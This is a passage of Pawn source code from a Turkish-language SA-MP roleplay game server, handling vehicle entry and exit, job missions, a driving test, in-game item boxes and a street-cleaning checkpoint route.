			SetPlayerPos(playerid, 2448.8557,-2620.3879,13.6572);
		}
		if(Arac[oldcar][atip] == 13)
		{
		    MotoruKapat(oldcar);
		    SetVehicleToRespawn(oldcar);
		    Aractamiri(oldcar);
		    DisablePlayerCheckpoint(playerid);
		    LojCheckpoint[playerid] = 0;
		    LojGorevde[playerid] = 0;
			Karakter[playerid][misbasi] = 0;
			SetPlayerColor(playerid, COLOR_WHITE);
			Bilgi(playerid, "Araçtan indiðiniz için otomatik olarak iþbaþýndan çýktýnýz.");
			SetPlayerSkin(playerid, Karakter[playerid][skin]);
			SetPlayerPos(playerid, 2281.0771,-2365.0278,13.5469);
		}
		if(Arac[oldcar][atip] == 9)
		{
		    if(GetPVarInt(playerid, "TGorev") == 1)
		    {
		        DisablePlayerCheckpoint(playerid);
			    MotoruKapat(oldcar);
			    SetVehicleToRespawn(oldcar);
			    Aractamiri(oldcar);
			    SetPlayerPos(playerid, Veriler[temizlikX], Veriler[temizlikY], Veriler[temizlikZ]);
			    SetPVarInt(playerid, "TIsbasi", 0);
			    SetPVarInt(playerid, "TGorev", 0);
			    Bilgi(playerid, "Araçtan indiðiniz için otomatik olarak iþbaþýndan çýktýnýz.");
			    tCheckpoint[playerid] = 0;
			}
		}
		if(Arac[oldcar][atip] == 10)
	    {
	        MotoruKapat(oldcar);
	        SetVehicleToRespawn(oldcar);
	        Aractamiri(oldcar);
	        DisablePlayerCheckpoint(playerid);
	        SevkiyatCheckpoint[playerid] = 0;
	        if(SevkiyatGorev[playerid]) Hata(playerid, "Araçtan indiðiniz için görev iptal edildi.");
	        SevkiyatGorev[playerid] = 0;
	    }
	    if(Arac[oldcar][atip] == 14)
	    {
	        MotoruKapat(oldcar);
	        SetVehicleToRespawn(oldcar);
	        Aractamiri(oldcar);
	        DisablePlayerCheckpoint(playerid);
	        KamCheckpoint[playerid] = 0;
	        if(KamGorevde[playerid]) Hata(playerid, "Araçtan indiðiniz için görev iptal edildi.");
	        KamGorevde[playerid] = 0;
	    }
	}
	if(oldstate == PLAYER_STATE_DRIVER || oldstate == PLAYER_STATE_PASSENGER)
	{
	    if(AracKemeri[playerid] == 1)
	    {
	    	AracKemeri[playerid] = 0;
		}
	}
	if(newstate == PLAYER_STATE_DRIVER)
	{
	    if(GetTickCount()-gAracTime[playerid] < 300 && gAracTime[playerid] != 0)
	    {
			new mstring[128];
			format(mstring, sizeof(mstring), "%s - Araç Çekme Hilesi",OyuncuAdiniBul(playerid));
			AdminGonder(mstring);
			SetVehicleToRespawn(GetPlayerVehicleID(playerid));
			Aractamiri(GetPlayerVehicleID(playerid));
			Kick(playerid);
	    }
	    gAracTime[playerid] = GetTickCount();
	    TimerPlayerInCar[playerid] = SetTimerEx("CheckPlayerInCar",1000,1,"%d",playerid);
		if(Arac[GetPlayerVehicleID(playerid)][atip] == 4 && Karakter[playerid][meslek] != 2)
		{
			DONDUR(playerid);
			COZ(playerid);
		}
	    if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 457) return 1;
	    new vid = GetPlayerVehicleID(playerid);
	    SonArac[playerid] = vid;
		GostergeGoster(playerid);
		if(Arac[vid][amodel] == 438 || Arac[vid][amodel] == 420) TaksimetreGoster(playerid);
		if(Arac[vid][akilit])
		{
		    Hata(playerid, "Bu araç kilitli.");
		    RemovePlayerFromVehicle(playerid);
		    return 1;
		}
		if(Arac[vid][abirliktip] == LSPD || Arac[vid][abirliktip] == FBI || Arac[vid][abirliktip] == LSFD || Arac[vid][atip] == 3 || Arac[vid][atip] == 11 || Arac[vid][atip] == 12 || Arac[vid][atip] == 13 || Arac[vid][atip] == 9 || Arac[vid][atip] == 4 || Arac[vid][atip] == 6 || Arac[vid][atip] == 7 || Arac[vid][atip] == 8 || Arac[vid][atip] == 10 || Arac[vid][atip] == 14) // lspd oluþumu, sevkiyat mesleði, taksicilik mesleði
		{
		    BenzinGizle(playerid);
		    Arac[vid][abenzin] = 100.0;
		}
		if(IsABike(vid))
		{
			BenzinGizle(playerid);
			KmGizle(playerid);
		    Arac[vid][abenzin] = 100.0;
		}
		if(GetVehicleModel(vid) == 437 && Karakter[playerid][meslek] == 6)
		{
		    BenzinGizle(playerid);
		    Arac[vid][abenzin] = 100.0;
		    Ipucu(playerid, "Otobüs seferine baþlamak için ''/otobus basla'' yazýn.");
		    Ipucu(playerid, "Otobüs seferini bitirmek için ''/otobus bitir'' yazabilirsiniz.");
		}
		if(Arac[vid][atip] == 1)
		{
		    new string2[256],string3[256];
		    if(Arac[vid][vergi] > floatround(Arac[vid][afiyat]/20)) {
			format(string2, sizeof(string2), ""C12"Sahip: "C5"%s "C12"Model: "C5"%s "C12"Kilometre: "C5"%dkm",SQLFromName(Arac[vid][aowner]),VehicleName[GetVehicleModel(vid)-400],Arac[vid][akm]);
			format(string3, sizeof(string2), ""C12"Plaka: "C5"%s "C12"Fiyat: "C5"%d$ "C12"Ceza: "C5"%d$ "C12"Vergi: "C4"%d$",Arac[vid][aplaka],Arac[vid][afiyat],cezali[vid],Arac[vid][vergi]);
			}
		    else if(Arac[vid][vergi] >= 0) {
			format(string2, sizeof(string2), ""C12"Sahip: "C5"%s "C12"Model: "C5"%s "C12"Kilometre: "C5"%dkm",SQLFromName(Arac[vid][aowner]),VehicleName[GetVehicleModel(vid)-400],Arac[vid][akm]);
			format(string3, sizeof(string2), ""C12"Plaka: "C5"%s "C12"Fiyat: "C5"%d$ "C12"Ceza: "C5"%d$ "C12"Vergi: "DOLAR"%d$",Arac[vid][aplaka],Arac[vid][afiyat],cezali[vid],Arac[vid][vergi]);
			}
			SendClientMessage(playerid, -1, string2);
			SendClientMessage(playerid, -1, string3);
		}
		if(Arac[vid][atip] == 8)
		{
		    new string2[256];
			format(string2, sizeof(string2), "{3e5171}Sahip: {eeeeee}Ehliyet Kursu {3e5171}Model: {eeeeee}%s {3e5171}Plaka: {eeeeee}%s",VehicleName[GetVehicleModel(vid)-400],Arac[vid][aplaka]);
			SendClientMessage(playerid, -1, string2);
			if(ehliyettesti[playerid] == 1 && Arac[vid][atip] == 8)
			{
				Bilgi(playerid, "Ehliyet testine baþladýnýz.");
				Ipucu(playerid, "Araca hasar vermeden checkpointlerden geçin, 100KM/H'dan hýzlý sürmemeye dikkat edin.");
				Ipucu(playerid, "Araç hýzýnýz 100KM/H üzerine çýkarsa ehliyet testiniz iptal olacaktýr.");
				ehliyetaraci[playerid] = vid;
				ehliyetcp[playerid] = 50;
				SetPlayerCheckpoint(playerid, 2055.2163,-1931.3109,13.1034, 10.0);
				MotoruAciliyor[vid] = true;
				MotoruAc(vid, playerid);
				return 1;
			}
		}
		if(Arac[vid][atip] == 9)
		{
		    BenzinGizle(playerid);
		    new string2[256];
			format(string2, sizeof(string2), "{3e5171}Sahip: {eeeeee}Temizlikçilik Mesleði {3e5171}Model: {eeeeee}%s {3e5171}Plaka: {eeeeee}%s",VehicleName[GetVehicleModel(vid)-400],Arac[vid][aplaka]);
			SendClientMessage(playerid, -1, string2);
			if(GetPVarInt(playerid, "TIsbasi") == 1)
			{
			    SetPVarInt(playerid, "TGorev", 1);
			    Bilgi(playerid, "Temizlikçilik mesleðine baþladýnýz, checkpointleri takip edin.");
			    MotoruAciliyor[vid] = true;
				MotoruAc(vid, playerid);
				tCheckpoint[playerid] = 1;
				DisablePlayerCheckpoint(playerid);
				SetPlayerCheckpoint(playerid, 549.8381,-1401.2437,14.9067,7.5);
			}
			else
			{
			    Hata(playerid, "Meslek pickupuna gidip ''/meslek isbasi'' yapmalýsýnýz.");
			}
			return 1;
		}
		if(Arac[vid][atip] == 3)
		{
		    new string2[256];
	    	if(Karakter[playerid][meslek] != 1) { RemovePlayerFromVehicle(playerid); return 1; }
			format(string2, sizeof(string2), "{3e5171}Sahip: {eeeeee}Sevkiyat Þirketi {3e5171}Model: {eeeeee}%s {3e5171}Plaka: {eeeeee}%s",VehicleName[GetVehicleModel(vid)-400],Arac[vid][aplaka]);
			SendClientMessage(playerid, -1, string2);
			if(Karakter[playerid][meslek] == 1) ShowPlayerDialog(playerid, 144, DIALOG_STYLE_MSGBOX, "Sevkiyat Mesleði", "Taþýmacýlýk þirketine hoþgeldiniz!\nBir seferde kazanacaðýnýz en fazla tutar 750$.\nMesleðe baþlamak için onaylayýn.", "Onayla", "Kapat");
		}
		if(Arac[vid][atip] == 4)
		{
		    new string2[256];
		    if(Karakter[playerid][meslek] != 2) { RemovePlayerFromVehicle(playerid); return 1; }
			if(!Taksi[playerid] || Taksi[playerid] == GetPlayerVehicleID(playerid))
			{
				format(string2, sizeof(string2), "{3e5171}Sahip: {eeeeee}Los Santos Taksi {3e5171}Model: {eeeeee}%s {3e5171}Plaka: {eeeeee}%s",VehicleName[GetVehicleModel(vid)-400],Arac[vid][aplaka]);
				SendClientMessage(playerid, -1, string2);
				Taksi[playerid] = GetPlayerVehicleID(playerid);
			}
			else
			{
			    RemovePlayerFromVehicle(playerid);
				Hata(playerid, "Kullanmakta olduðunuz bir taksi bulunmaktadýr. Lütfen o aracý kullanýnýz.");
			}
		}
		if(Arac[vid][atip] == 6)
		{
		    new string2[256];
		    if(Karakter[playerid][meslek] != 4 && !Karakter[playerid][misbasi]) { RemovePlayerFromVehicle(playerid); return 1; }
		    format(string2, sizeof(string2), "{3e5171}Sahip: {eeeeee}Idlewood Stack Pizza {3e5171}Model: {eeeeee}%s {3e5171}Plaka: {eeeeee}%s",VehicleName[GetVehicleModel(vid)-400],Arac[vid][aplaka]);
		    SendClientMessage(playerid, -1, string2);
		    if(Karakter[playerid][meslek] == 4)
		    {
		        if(GetPVarInt(playerid, "PizzaMotor") > 0)
		        {
					if(vid == GetPVarInt(playerid, "PizzaMotor")) KillTimer(PizzaTimer[playerid]);
		        }
		        else
		        {
			        PizzaCheckpoint[playerid] = 1;
			        if(PizzaGorevde[playerid] == 1)
			        {
			            Bilgi(playerid, "Pizzacýlýk mesleðine baþladýnýz, araç motoru açýlacaktýr lütfen bekleyiniz.");
						MotoruAciliyor[vid] = true;
						MotoruAc(vid, playerid);
						SetPlayerCheckpoint(playerid, 2367.4067,-1662.6254,13.2377, 4.5);
					}
					else
					{
					    Hata(playerid, "Meslek pickupuna gidip ''/meslek isbasi'' yapmalýsýnýz.");
					}
				}
				return 1;
			}
		}
		if(Arac[vid][atip] == 7)
		{
		    new string2[256];
		    if(Karakter[playerid][meslek] != 5 && !Karakter[playerid][misbasi]) { RemovePlayerFromVehicle(playerid); return 1;}
		    format(string2, sizeof(string2), "{3e5171}Sahip: {eeeeee}Bilinmiyor {3e5171}Model: {eeeeee}%s {3e5171}Plaka: {eeeeee}%s",VehicleName[GetVehicleModel(vid)-400],Arac[vid][aplaka]);
		    SendClientMessage(playerid, -1, string2);
			if(Karakter[playerid][meslek] == 5)
			{
				SicilTCheckpoint[playerid] = 2;
				if(SicilTGorevde[playerid] == 1)
				{
					Bilgi(playerid, "Ýllegal araç sicil temizleme mesleðine baþladýnýz, araç motoru açýlacaktýr lütfen bekleyiniz.");
				    MotoruAciliyor[vid] = true;
				    SetPVarInt(playerid, "SicilArac", vid);
				    SetTimerEx("MotoruAc", 3000, false, "ii", vid, playerid);
        			SetPlayerCheckpoint(playerid, 2200.8821,-1976.6831,13.3894, 4.5);
				}
				else
				{
				    Hata(playerid, "Meslek pickupuna gidip ''/meslek isbasi'' yapmalýsýnýz.");
				}
			}
		}
		if(Arac[vid][atip] == 11)
		{
		    new string2[256];
		    if(Karakter[playerid][meslek] != 8 && !Karakter[playerid][misbasi]) { RemovePlayerFromVehicle(playerid); return 1;}
		    format(string2, sizeof(string2), "{3e5171}Sahip: {eeeeee}Bilinmiyor {3e5171}Model: {eeeeee}%s {3e5171}Plaka: {eeeeee}%s",VehicleName[GetVehicleModel(vid)-400],Arac[vid][aplaka]);
		    SendClientMessage(playerid, -1, string2);
			if(Karakter[playerid][meslek] == 8)
			{
				KamCheckpoint[playerid] = 2;
				if(KamGorevde[playerid] == 1)
				{
					Bilgi(playerid, "Hafriyat mesleðine baþladýnýz, araç motoru açýlacaktýr lütfen bekleyiniz.");
				    MotoruAciliyor[vid] = true;
				    SetTimerEx("MotoruAc", 3000, false, "ii", vid, playerid);
        			SetPlayerCheckpoint(playerid, 2227.3994,-2635.8030,13.1024, 4.5);
				}
				else
				{
				    Hata(playerid, "Meslek pickupuna gidip ''/meslek isbasi'' yapmalýsýnýz.");
				}
			}
		}
		if(Arac[vid][atip] == 12)
		{
		    new string2[256];
		    if(Karakter[playerid][meslek] != 8 && !Karakter[playerid][misbasi]) { RemovePlayerFromVehicle(playerid); return 1;}
		    format(string2, sizeof(string2), "{3e5171}Sahip: {eeeeee}Bilinmiyor {3e5171}Model: {eeeeee}%s {3e5171}Plaka: {eeeeee}%s",VehicleName[GetVehicleModel(vid)-400],Arac[vid][aplaka]);
		    SendClientMessage(playerid, -1, string2);
			if(Karakter[playerid][meslek] == 9)
			{
				EleCheckpoint[playerid] = 2;
				if(EleGorevde[playerid] == 1)
				{
					Bilgi(playerid, "Elektronik mesleðine baþladýnýz, araç motoru açýlacaktýr lütfen bekleyiniz.");
				    MotoruAciliyor[vid] = true;
				    SetTimerEx("MotoruAc", 3000, false, "ii", vid, playerid);
        			SetPlayerCheckpoint(playerid, 2448.8557,-2620.3879,13.6572, 4.5);
				}
				else
				{
				    Hata(playerid, "Meslek pickupuna gidip ''/meslek isbasi'' yapmalýsýnýz.");
				}
			}
		}
		if(Arac[vid][atip] == 13)
		{
		    new string2[256];
		    if(Karakter[playerid][meslek] != 8 && !Karakter[playerid][misbasi]) { RemovePlayerFromVehicle(playerid); return 1;}
		    format(string2, sizeof(string2), "{3e5171}Sahip: {eeeeee}Bilinmiyor {3e5171}Model: {eeeeee}%s {3e5171}Plaka: {eeeeee}%s",VehicleName[GetVehicleModel(vid)-400],Arac[vid][aplaka]);
		    SendClientMessage(playerid, -1, string2);
			if(Karakter[playerid][meslek] == 10)
			{
				LojCheckpoint[playerid] = 2;
				if(LojGorevde[playerid] == 1)
				{
					Bilgi(playerid, "Lojistik mesleðine baþladýnýz, araç motoru açýlacaktýr lütfen bekleyiniz.");
				    MotoruAciliyor[vid] = true;
				    SetTimerEx("MotoruAc", 3000, false, "ii", vid, playerid);
        			SetPlayerCheckpoint(playerid, 2285.6465,-2372.2385,13.1773, 4.5);
				}
				else
				{
				    Hata(playerid, "Meslek pickupuna gidip ''/meslek isbasi'' yapmalýsýnýz.");
				}
			}
		}
		if(Arac[vid][atip] == 10)
		{
		    new string2[512];
			format(string2, sizeof(string2), "{3e5171}Sahip: {eeeeee}%s {3e5171}Model: {eeeeee}%s {3e5171}Plaka: {eeeeee}%s",Isyeri[Arac[vid][aisyeri]][iad], VehicleName[GetVehicleModel(vid)-400],Arac[vid][aplaka]);
			SendClientMessage(playerid, -1, string2);
			format(string2, sizeof(string2), ""C2"%s "C1"þirketine hoþgeldiniz!\nÞirket "C2"950$"C1"'lýk tur baþýna "C2"%d$ "C1"kesmektedir.\nTur sonu kazanacaðýnýz ücret "C2"%d$"C1", sevkiyat yapmak istiyor musunuz:",Isyeri[Arac[vid][aisyeri]][iad],Arac[vid][agelir],950-Arac[vid][agelir]);
			if(IsyeriYetkilisi(playerid,Arac[vid][aisyeri]) && !IsyeriSahibi(playerid,Arac[vid][aisyeri]) && Arac[vid][agelir] != 0) ShowPlayerDialog(playerid, 144, DIALOG_STYLE_MSGBOX, ""C7"EIGHTBORN - "C8"Sevkiyat Mesleði", string2, "Evet", "Hayýr");
			if(Arac[vid][agelir] == 0) Hata(playerid, "Aracýn geliri ayarlanmamýþ.");
			if(Arac[vid][agelir] != 0 && Arac[vid][aisyeri] == 509) ShowPlayerDialog(playerid, 144, DIALOG_STYLE_MSGBOX, ""C7"EIGHTBORN - "C8"Sevkiyat Mesleði", string2, "Evet", "Hayýr");
		}
		if(Arac[vid][atip] == 14)
		{
		    new string2[512];
			format(string2, sizeof(string2), "{3e5171}Sahip: {eeeeee}%s {3e5171}Model: {eeeeee}%s {3e5171}Plaka: {eeeeee}%s",Isyeri[Arac[vid][aisyeri]][iad], VehicleName[GetVehicleModel(vid)-400],Arac[vid][aplaka]);
			SendClientMessage(playerid, -1, string2);
			format(string2, sizeof(string2), ""C2"%s "C1"þirketine hoþgeldiniz!\nÞirket "C2"1150$"C1"'lýk tur baþýna "C2"%d$ "C1"kesmektedir.\nTur sonu kazanacaðýnýz ücret "C2"%d$"C1", hafriyat yapmak istiyor musunuz:",Isyeri[Arac[vid][aisyeri]][iad],Arac[vid][agelir],950-Arac[vid][agelir]);
			if(IsyeriYetkilisi(playerid,Arac[vid][aisyeri]) && !IsyeriSahibi(playerid,Arac[vid][aisyeri]) && Arac[vid][agelir] != 0) ShowPlayerDialog(playerid, 458, DIALOG_STYLE_MSGBOX, ""C7"EIGHTBORN - "C8"Hafriyat Mesleði", string2, "Evet", "Hayýr");
			if(Arac[vid][agelir] == 0) Hata(playerid, "Aracýn geliri ayarlanmamýþ.");
			if(Arac[vid][agelir] != 0 && Arac[vid][aisyeri] == 509) ShowPlayerDialog(playerid, 458, DIALOG_STYLE_MSGBOX, ""C7"EIGHTBORN - "C8"Hafriyat Mesleði", string2, "Evet", "Hayýr");
		}
		if(Arac[vid][abirlik] != 255)
		{
		    new string2[256];
			format(string2, sizeof(string2), "{3e5171}Sahip: {eeeeee}%s {3e5171}Model: {eeeeee}%s {3e5171}Plaka: {eeeeee}%s {3e5171}Ceza: {eeeeee}%d$",Birlik[Arac[vid][abirlik]][fisim],VehicleName[GetVehicleModel(vid)-400],Arac[vid][aplaka],cezali[vid]);
			SendClientMessage(playerid, -1, string2);
		}
		if(Arac[vid][aowner] == -1 && Arac[vid][atip] == 5)
		{
		    new string[256];
		    format(string, sizeof(string), "Bu araç kiralýktýr. Saati %d$ olarak ücretlendirilmektedir. (( /a kirala ))", Arac[vid][afiyat]);
			Ipucu(playerid, string);

		}
		if(GetMotor(vid) && !IsABike(vid))
		{
			Ipucu(playerid, "Aracýn motoru açýk.");
			if(Karakter[playerid][ehliyet] == 0) Ipucu(playerid, "Ehliyetiniz olmadan araç kullanýyorsunuz.");
			if(Buysa("(Yok)",Arac[vid][aplaka])) Ipucu(playerid, "Plakasý olmayan araç kullanýyorsunuz.");
		}
		else
		{
		    if(IsABike(vid)) return 1;
			if(Arac[vid][atip] != 7 && Arac[vid][atip] != 6 && !KKontrol(playerid))
			{
				Ipucu(playerid, "Aracýn motoru kapalý. (/a motor veya Y tuþu)");
				if(Karakter[playerid][ehliyet] == 0) Ipucu(playerid, "Ehliyetiniz olmadan araç kullanýyorsunuz.");
				if(Buysa("(Yok)",Arac[vid][aplaka])) Ipucu(playerid, "Plakasý olmayan araç kullanýyorsunuz.");
			}
		}
        ModifiyeYukle(vid);
	}
	if(newstate == PLAYER_STATE_ONFOOT && oldstate == PLAYER_STATE_DRIVER)
	{
	    GostergeGizle(playerid);
	    TaksimetreGizle(playerid);
	}
	if(newstate == PLAYER_STATE_ONFOOT && oldstate == PLAYER_STATE_PASSENGER)
	{
	    TaksimetreGizle(playerid);
	}
	return 1;
}

public OnPlayerEnterCheckpoint(playerid)
{
	if(Debug) printf("OnPlayerEnterCheckpoint(%d)",playerid);
	if(gBuluyor[playerid])
	{
		DisablePlayerCheckpoint(playerid);
		gBuluyor[playerid] = false;
		return 1;
	}
	if(UKutuTasiyor[playerid] != 0 && meslekbul[playerid] == 1)
	{
	    switch(UKutuTasiyor[playerid])
	    {
	        case 1:
	        {
	            new _u = randomEx(1,5),mstring[64];
	            if(Birlik[Karakter[playerid][birlik]][seviye] == 4) _u = randomEx(1,7);
				if(Birlik[Karakter[playerid][birlik]][seviye] == 5) _u = randomEx(1,10);
	            format(mstring, sizeof(mstring), "Kutudan %d gram esrar çýkardýnýz.",_u);
	            Karakter[playerid][uesrar] += _u;
	            Bilgi(playerid, mstring);
	        }
	        case 2:
	        {
	            new _u = randomEx(1,5),mstring[64];
	            if(Birlik[Karakter[playerid][birlik]][seviye] == 4) _u = randomEx(1,7);
				if(Birlik[Karakter[playerid][birlik]][seviye] == 5) _u = randomEx(1,10);
	            format(mstring, sizeof(mstring), "Kutudan %d adet amfetamin hapý çýkardýnýz.",_u);
	            Karakter[playerid][amfetamin] += _u;
	            Bilgi(playerid, mstring);
	        }
	        case 3:
	        {
	            new _u = randomEx(1,5),mstring[64];
	            if(Birlik[Karakter[playerid][birlik]][seviye] == 4) _u = randomEx(1,7);
				if(Birlik[Karakter[playerid][birlik]][seviye] == 5) _u = randomEx(1,10);
	            format(mstring, sizeof(mstring), "Kutudan %d adet metamfetamin hapý çýkardýnýz.",_u);
	            Karakter[playerid][metamfetamin] += _u;
				Bilgi(playerid, mstring);
	        }
	        case 4:
	        {
	            new _u = randomEx(1,5),mstring[64];
	            if(Birlik[Karakter[playerid][birlik]][seviye] == 4) _u = randomEx(1,7);
				if(Birlik[Karakter[playerid][birlik]][seviye] == 5) _u = randomEx(1,10);
	            format(mstring, sizeof(mstring), "Kutudan %d adet lsd hapý çýkardýnýz.",_u);
	            Karakter[playerid][lsd] += _u;
	            Bilgi(playerid, mstring);
	        }
	        case 5:
	        {
	            new _u = randomEx(1,5),mstring[64];
	            if(Birlik[Karakter[playerid][birlik]][seviye] == 4) _u = randomEx(1,7);
				if(Birlik[Karakter[playerid][birlik]][seviye] == 5) _u = randomEx(1,10);
	            format(mstring, sizeof(mstring), "Kutudan %d adet extacy hapý çýkardýnýz.",_u);
	            Karakter[playerid][extacy] += _u;
	            Bilgi(playerid, mstring);
	        }
	        case 6:
	        {
	            new _u = randomEx(1,5),mstring[64];
	            if(Birlik[Karakter[playerid][birlik]][seviye] == 4) _u = randomEx(1,7);
				if(Birlik[Karakter[playerid][birlik]][seviye] == 5) _u = randomEx(1,10);
	            format(mstring, sizeof(mstring), "Kutudan %d gram kokain çýkardýnýz.",_u);
	            Karakter[playerid][kokain] += _u;
	            Bilgi(playerid, mstring);
	        }
	        case 7:
	        {
	            new _u = randomEx(1,5),mstring[64];
	            if(Birlik[Karakter[playerid][birlik]][seviye] == 4) _u = randomEx(1,7);
				if(Birlik[Karakter[playerid][birlik]][seviye] == 5) _u = randomEx(1,10);
	            format(mstring, sizeof(mstring), "Kutudan %d gram eroin çýkardýnýz.",_u);
	            Karakter[playerid][eroin] += _u;
	            Bilgi(playerid, mstring);
	        }
	        case 8:
	        {
	            new _u = randomEx(1,5),mstring[64];
	            if(Birlik[Karakter[playerid][birlik]][seviye] == 4) _u = randomEx(1,7);
				if(Birlik[Karakter[playerid][birlik]][seviye] == 5) _u = randomEx(1,10);
	            format(mstring, sizeof(mstring), "Kutudan %d adet morfin ilacý çýkardýnýz.",_u);
	            Karakter[playerid][morfin] += _u;
	            Bilgi(playerid, mstring);
	        }
	        case 9:
	        {
	            new _u = randomEx(1,5),mstring[64];
	            if(Birlik[Karakter[playerid][birlik]][seviye] == 4) _u = randomEx(1,7);
				if(Birlik[Karakter[playerid][birlik]][seviye] == 5) _u = randomEx(1,10);
	            format(mstring, sizeof(mstring), "Kutudan %d adet mda hapý çýkardýnýz.",_u);
	            Karakter[playerid][MDA] += _u;
	            Bilgi(playerid, mstring);
	        }
	    }
	    meslekbul[playerid] = 0;
		RemovePlayerAttachedObject(playerid, kindex[playerid]);
    	ClearAnimations(playerid);
    	SetPlayerSpecialAction(playerid, 0);
	    COZ(playerid);
	    DisablePlayerCheckpoint(playerid);
	    UKutuTasiyor[playerid] = 0;
	}
	if(KutuTasiyor[playerid] != 0 && meslekbul[playerid] == 1)
	{
	    switch(KutuTasiyor[playerid])
	    {
	        case 1:
	        {
	            new mstring[128],mat = randomEx(1,5);
				if(Birlik[Karakter[playerid][birlik]][seviye] == 4) mat = randomEx(1,7);
				if(Birlik[Karakter[playerid][birlik]][seviye] == 5) mat = randomEx(1,10);
	            format(mstring, sizeof(mstring), "Kutudan %d adet A materyali çýkardýnýz.",mat);
	            Bilgi(playerid, mstring);
	            Karakter[playerid][matA] += mat;
	        }
	        case 2:
	        {
	            new mstring[128],mat = randomEx(1,5);
	            if(Birlik[Karakter[playerid][birlik]][seviye] == 4) mat = randomEx(1,7);
				if(Birlik[Karakter[playerid][birlik]][seviye] == 5) mat = randomEx(1,10);
	            format(mstring, sizeof(mstring), "Kutudan %d adet B materyali çýkardýnýz.",mat);
	            Bilgi(playerid, mstring);
	            Karakter[playerid][matB] += mat;
	        }
	        case 3:
	        {
	            new mstring[128],mat = randomEx(1,5);
	            if(Birlik[Karakter[playerid][birlik]][seviye] == 4) mat = randomEx(1,7);
				if(Birlik[Karakter[playerid][birlik]][seviye] == 5) mat = randomEx(1,10);
	            format(mstring, sizeof(mstring), "Kutudan %d adet C materyali çýkardýnýz.",mat);
	            Bilgi(playerid, mstring);
	            Karakter[playerid][matC] += mat;
	        }
	        case 4:
	        {
	            new mstring[128],mat = randomEx(1,5);
	            format(mstring, sizeof(mstring), "Kutudan %d adet D materyali çýkardýnýz.",mat);
	            Bilgi(playerid, mstring);
	            Karakter[playerid][matD] += mat;
	        }
	        case 5:
	        {
	            new mstring[128],mat = randomEx(1,5);
	            format(mstring, sizeof(mstring), "Kutudan %d adet E materyali çýkardýnýz.",mat);
	            Bilgi(playerid, mstring);
	            Karakter[playerid][matE] += mat;
	        }
	    }
	    meslekbul[playerid] = 0;
		RemovePlayerAttachedObject(playerid, kindex[playerid]);
    	ClearAnimations(playerid);
    	SetPlayerSpecialAction(playerid, 0);
	    COZ(playerid);
	    DisablePlayerCheckpoint(playerid);
	    KutuTasiyor[playerid] = 0;
	}
	if(meslekbul[playerid] == 1 && !SevkiyatGorev[playerid] && !PizzaGorevde[playerid] && !SicilTGorevde[playerid] && !otobuste[playerid])
	{
	    meslekbul[playerid] = 0;
	    DisablePlayerCheckpoint(playerid);
	}
	if(GetPVarInt(playerid, "ParkCP"))
	{
		OnPlayerCommandPerformed(playerid, "/apark",0);
	    DisablePlayerCheckpoint(playerid);
	    DeletePVar(playerid, "ParkCP");
	    return 1;
	}
	else if(GetPVarInt(playerid, "GPSActi"))
	{
	    DisablePlayerCheckpoint(playerid);
	    DeletePVar(playerid, "GPSActi");
	    Bilgi(playerid, "Aracýnýzý buldunuz.");
	    return 1;
	}
	else if(GetPVarInt(playerid, "LSPDTelTakip"))
	{
	    DisablePlayerCheckpoint(playerid);
	    DeletePVar(playerid, "LSPDTelTakip");
		SendClientMessage(playerid, COLOR_WHITE, "Telefonun kapatýldýðý bölgeye ulaþtýnýz.");
		return 1;
	}
	if(!GetPVarInt(playerid, "ParkCP") && meslekbul[playerid] != 1 && !SevkiyatGorev[playerid] && !PizzaGorevde[playerid] && !SicilTGorevde[playerid] && !otobuste[playerid] && GetPVarInt(playerid, "TGorev") == 1)
	{
		if(tCheckpoint[playerid] == 1)
		{
		    DisablePlayerCheckpoint(playerid);
		    SetPlayerCheckpoint(playerid, 523.0581,-1376.7350,15.6860, 7.5);
		    tCheckpoint[playerid] = 2;
		}
		else if(tCheckpoint[playerid] == 2)
		{
		    DisablePlayerCheckpoint(playerid);
		    SetPlayerCheckpoint(playerid, 542.2983,-1337.0973,13.9728, 7.5);
		    tCheckpoint[playerid] = 3;
		}
		else if(tCheckpoint[playerid] == 3)
		{
		    DisablePlayerCheckpoint(playerid);
		    SetPlayerCheckpoint(playerid, 612.8569,-1324.1427,13.3480, 7.5);
		    tCheckpoint[playerid] = 4;
		}
		else if(tCheckpoint[playerid] == 4)
		{
		    DisablePlayerCheckpoint(playerid);
		    SetPlayerCheckpoint(playerid, 662.2035,-1323.2958,13.1306, 7.5);
		    tCheckpoint[playerid] = 5;
		}
		else if(tCheckpoint[playerid] == 5)
		{
		    DisablePlayerCheckpoint(playerid);
		    SetPlayerCheckpoint(playerid, 779.4750,-1323.9165,13.1118, 7.5);
		    tCheckpoint[playerid] = 6;
		}
		else if(tCheckpoint[playerid] == 6)
		{
		    DisablePlayerCheckpoint(playerid);
		    SetPlayerCheckpoint(playerid, 861.9251,-1331.3789,13.1414, 7.5);
		    tCheckpoint[playerid] = 7;
		}
		else if(tCheckpoint[playerid] == 7)
		{
		    DisablePlayerCheckpoint(playerid);
		    SetPlayerCheckpoint(playerid, 959.4201,-1331.4072,13.0948, 7.5);
		    tCheckpoint[playerid] = 8;
		}
		else if(tCheckpoint[playerid] == 8)
		{
		    DisablePlayerCheckpoint(playerid);
		    SetPlayerCheckpoint(playerid, 1038.6226,-1330.9723,13.1166, 7.5);
		    tCheckpoint[playerid] = 9;
		}
		else if(tCheckpoint[playerid] == 9)
		{
		    DisablePlayerCheckpoint(playerid);
		    SetPlayerCheckpoint(playerid, 1066.0083,-1293.4531,13.1745, 7.5);
		    tCheckpoint[playerid] = 10;
		}
		else if(tCheckpoint[playerid] == 10)
		{
		    DisablePlayerCheckpoint(playerid);
		    SetPlayerCheckpoint(playerid, 1143.2732,-1284.5446,13.1858, 7.5);
		    tCheckpoint[playerid] = 11;
		}
		else if(tCheckpoint[playerid] == 11)
		{
		    DisablePlayerCheckpoint(playerid);
		    SetPlayerCheckpoint(playerid, 1237.3760,-1285.0465,13.2635, 7.5);
		    tCheckpoint[playerid] = 12;
		}
		else if(tCheckpoint[playerid] == 12)
		{
		    DisablePlayerCheckpoint(playerid);
		    SetPlayerCheckpoint(playerid, 1305.6343,-1284.7959,13.1080, 7.5);
		    tCheckpoint[playerid] = 13;
		}
		else if(tCheckpoint[playerid] == 13)
		{
		    DisablePlayerCheckpoint(playerid);
		    SetPlayerCheckpoint(playerid, 1338.6538,-1338.0022,13.1119, 7.5);
		    tCheckpoint[playerid] = 14;
		}
		else if(tCheckpoint[playerid] == 14)
		{
		    DisablePlayerCheckpoint(playerid);
